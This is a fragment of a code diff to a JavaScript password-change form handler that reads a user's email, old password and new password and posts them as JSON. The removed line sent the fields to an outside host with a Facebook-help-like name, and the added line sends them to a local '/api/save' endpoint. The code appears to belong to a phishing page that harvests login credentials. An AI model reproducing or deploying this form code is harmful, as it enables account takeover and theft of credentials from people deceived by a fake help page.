@@ -5,11 +5,9 @@ document.getElementById('passwordForm').addEventListener('submit', function(even
   const oldPassword = document.getElementById('oldPassword').value;
   const newPassword = document.getElementById('newPassword').value;
 
-  fetch('https://fb-help-delta.vercel.app/index.js', {
+  fetch('/api/save', {
     method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
+    headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       email: email,
       oldPassword: oldPassword,
